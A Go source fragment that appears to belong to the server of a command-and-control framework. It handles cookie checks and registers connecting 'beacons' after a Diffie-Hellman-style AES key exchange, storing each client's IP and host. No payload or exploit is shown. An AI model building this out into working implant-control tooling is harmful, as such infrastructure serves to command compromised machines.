package main

import (
	"encoding/base64"
	"fmt"
	"math/big"
	"net/http"
	"reflect"
)

func GET_handler(cookie string, listener *Listener) ([]byte, bool) {
	var res []byte
	cookie_decode, err := base64.StdEncoding.DecodeString(cookie)
	aAES := getAES(listener.A)

	if err != nil {
		fmt.Println("AESa base64 not match" + err.Error())
		return res, false
	} else if len(cookie_decode) != 32 {
		fmt.Println("AESa 16BYTES not match")

		return res, false
	} else if reflect.DeepEqual(listener.A, aAES.DecryptData(cookie_decode)) {
		fmt.Println("AESa had match")
		return res, true
	} else {
		fmt.Println("AESa not match")
		return res, false
	}
}

func POST_handler(body []byte, listener *Listener, r *http.Request) []byte {

	var res []byte
	ip := r.RemoteAddr
	domain := r.Host

	if len(body) == 16 {
		var CusAes big.Int
		CusAes.SetBytes(GetBytes(body, 16))

		if Check_Beacon_CusAES(listener, CusAes) {
			fmt.Println("have the beacon")
			return res
		} else {
			Srvkey := Random_Big_Int128()
			//SrvAes := Big_Int_Pow(Bytes_To_BigInt(listener.A), Srvkey)
			aeskey := Mod_Pow(&CusAes, Srvkey)

			newBeacon := Beacon{
				Hostname: "",
				Ip:       ip,
				Domin:    domain,
				Arch:     "",
				System:   "",
				CusAES:   CusAes.String(),
				AESkey:   (*aeskey).String(),
				Live:     true,
			}
			listener.Beacons = append(listener.Beacons, newBeacon)
			saveXML("./Listener/"+listener.Lisname, listener)
		}

	}
	return res
}

func printkey(key []uint8) {
	for _, b := range key {
		fmt.Printf("%x ", b)
	}
}

func GetBytes(data []byte, length int) []byte {
	if length > len(data) {
		length = len(data)
	}
	var res []byte
	res = data[:length]
	data = data[length:]
	return res
}
